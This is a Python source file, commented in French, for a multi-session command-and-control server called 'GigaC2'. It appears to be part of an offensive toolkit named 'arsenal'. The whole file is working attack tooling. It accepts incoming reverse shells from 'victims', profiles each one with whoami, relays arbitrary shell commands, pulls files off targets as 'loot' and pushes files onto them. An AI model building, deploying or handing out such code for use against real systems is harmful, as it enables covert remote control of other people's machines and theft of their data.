import socket
import threading
import os
import time
from core.reporter import add_finding

class GigaC2:
    def __init__(self, host='0.0.0.0', port=4444):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.host = host
        self.port = port
        self.sessions = {}
        self.session_count = 0
        self.running = True

    def listen_for_clients(self):
        """1. MULTI-SESSION : Tourne en arrière-plan pour écouter les nouvelles victimes."""
        try:
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            print(f"[*] C2 en écoute sur {self.host}:{self.port}...")
        except Exception as e:
            print(f"[-] Erreur de liaison: {e}")
            self.running = False
            return

        while self.running:
            try:
                client_soc, addr = self.server.accept()
                self.session_count += 1
                session_id = self.session_count
                
                # On stocke la victime dans le dictionnaire des sessions
                self.sessions[session_id] = {"socket": client_soc, "addr": addr, "info": "Inconnu"}
                
                print(f"\n[\033[92m+\033[0m] BINGO ! Nouvelle victime connectée : Session {session_id} ({addr[0]})")
                add_finding("C2 Server", addr[0], f"Reverse Shell établi - Session {session_id}")
                
                # 3. AUTOMATISATION : On lance la reconnaissance instantanée
                threading.Thread(target=self.auto_recon, args=(session_id, client_soc)).start()
                
            except Exception:
                break

    def auto_recon(self, session_id, client_soc):
        """Exécute des commandes de base dès la connexion pour profiler la cible."""
        try:
            time.sleep(1) # Laisse le temps à la connexion de se stabiliser
            client_soc.send(b"whoami\n")
            user_info = client_soc.recv(1024).decode(errors='replace').strip()
            if user_info:
                self.sessions[session_id]["info"] = user_info
                print(f"[\033[94m*\033[0m] Session {session_id} identifiée comme : {user_info}")
        except:
            pass

    def interact(self, session_id):
        """Prend le contrôle exclusif d'une session."""
        session = self.sessions.get(session_id)
        if not session:
            print("[-] Session introuvable ou déconnectée.")
            return

        soc = session["socket"]
        print(f"\n[\033[93m*\033[0m] Prise de contrôle de la Session {session_id}. Tapez 'background' pour cacher.")
        
        while True:
            try:
                cmd = input(f"\033[91m(Session {session_id} - {session['info']}) > \033[0m")
                if cmd.strip() == "background":
                    break
                if not cmd.strip():
                    continue

                # 2. UPLOAD / DOWNLOAD : Interception des commandes de transfert
                if cmd.startswith("download "):
                    filename = cmd.split(" ", 1)[1]
                    print(f"[*] Ordre de téléchargement envoyé pour : {filename}")
                    soc.send(cmd.encode() + b"\n")
                    
                    # On reçoit le fichier (simplifié pour l'exemple)
                    data = soc.recv(4096 * 10) 
                    with open(f"loot_{filename}", "wb") as f:
                        f.write(data)
                    print(f"[\033[92m+\033[0m] Fichier volé et sauvegardé sous loot_{filename}")
                    add_finding("C2 Exfiltration", session['addr'][0], f"Fichier exfiltré : **{filename}**")
                    continue
                    
                elif cmd.startswith("upload "):
                    filename = cmd.split(" ", 1)[1]
                    if not os.path.exists(filename):
                        print(f"[-] Fichier local '{filename}' introuvable.")
                        continue
                    
                    print(f"[*] Upload de {filename} en cours...")
                    soc.send(cmd.encode() + b"\n")
                    time.sleep(0.5)
                    with open(filename, "rb") as f:
                        soc.send(f.read())
                    print("[\033[92m+\033[0m] Fichier injecté sur la cible.")
                    continue

                # Exécution système classique
                soc.send(cmd.encode() + b"\n")
                response = soc.recv(8192).decode(errors='replace')
                print(response, end="")
                
            except Exception as e:
                print(f"\n[-] Connexion perdue avec la cible. ({e})")
                del self.sessions[session_id]
                break

    def run(self):
        # Le listener tourne en tâche de fond (daemon)
        listener_thread = threading.Thread(target=self.listen_for_clients, daemon=True)
        listener_thread.start()
        
        time.sleep(0.5)
        print("\n\033[91m\033[1m=== GIGA C2 MULTI-SESSIONS ACTIF ===\033[0m")
        print("Commandes : \033[96mlist\033[0m, \033[96minteract <id>\033[0m, \033[96mexit\033[0m")

        while self.running:
            try:
                choice = input("\nC2-Main > ").strip().split()
                if not choice: continue
                
                cmd = choice[0]
                if cmd == "list":
                    print("\n--- Sessions Actives ---")
                    if not self.sessions:
                        print("Aucune victime connectée.")
                    for sid, info in self.sessions.items():
                        print(f"  [\033[92mID: {sid}\033[0m] IP: {info['addr'][0]} | User: {info['info']}")
                    print("------------------------")
                elif cmd == "interact" and len(choice) > 1:
                    self.interact(int(choice[1]))
                elif cmd == "exit":
                    print("[*] Fermeture du C2. Destruction des sessions...")
                    self.running = False
                    self.server.close()
                    break
                else:
                    print("[-] Commande inconnue.")
            except KeyboardInterrupt:
                break

def run_c2(args):
    """Wrapper pour arsenal.py"""
    c2 = GigaC2(port=args.port)
    c2.run()